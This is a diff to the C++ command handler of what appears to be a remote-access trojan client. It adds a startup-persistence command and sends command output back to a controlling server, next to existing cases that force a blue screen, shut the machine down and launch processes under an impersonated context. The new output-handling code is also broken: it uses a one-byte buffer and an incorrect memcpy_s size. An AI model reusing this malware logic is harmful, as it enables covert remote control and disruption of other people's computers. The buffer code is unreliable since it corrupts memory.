@@ -211,8 +211,13 @@ const CMDDESC Client::CreateCommandDescription(const Packet& command) {
 BOOL Client::PerformCommand(const Packet& command, ClientResponse& outResponse) {
     BOOL    success     = FALSE;
     CMDDESC description = CreateCommandDescription(command);
+    char*   cmdOut = new char; // output of system()
 
     switch ( command.action ) {
+    case RemoteAction::kAddToStartup:
+        this->m_ProcMgr.AddProcessToStartup(command.buffer);
+        success = TRUE;
+        break;
     case RemoteAction::kPingClient:
         success = TRUE;
         break;
@@ -220,15 +225,13 @@ BOOL Client::PerformCommand(const Packet& command, ClientResponse& outResponse) 
         this->m_ProcMgr.BSOD();
         break;
     case RemoteAction::kRemoteShutdown:
-        if ( command.buffer == "restart" )
-            this->m_ProcMgr.ShutdownSystem(ShutdownReboot);
-        else if ( command.buffer == "shutdown" )
-            this->m_ProcMgr.ShutdownSystem(ShutdownPowerOff);
+        if ( strcmp(command.buffer, "shutdown") == 0 )
+            ProcessManager::ShutdownSystem(ShutdownPowerOff);
+        else if ( strcmp(command.buffer, "restart") == 0 )
+            ProcessManager::ShutdownSystem(ShutdownReboot);
 
         break;
     case RemoteAction::kOpenRemoteProcess:
-        STARTUPINFO si = {};
-        PROCESS_INFORMATION pi = {};
 
         success = this->m_ProcMgr.OpenProcessAsImposter(
             description.creationContext,
@@ -238,8 +241,8 @@ BOOL Client::PerformCommand(const Packet& command, ClientResponse& outResponse) 
             description.creationFlags,
             NULL,
             NULL,
-            &si,
-            &pi
+            description.respondToServer,
+            cmdOut
         );
 
         break;
@@ -248,7 +251,11 @@ BOOL Client::PerformCommand(const Packet& command, ClientResponse& outResponse) 
     if ( description.respondToServer ) {
         outResponse.actionPerformed = command.action;
         outResponse.responseCode = (success == TRUE) ? ClientResponseCode::kResponseOk : ClientResponseCode::kResponseError;
+        memcpy_s(outResponse.buffer, strlen(outResponse.buffer), cmdOut, strlen(cmdOut) );
+        outResponse.buffLen = strlen(outResponse.buffer);
     }
+
+    delete cmdOut;
 
     return success;
 }
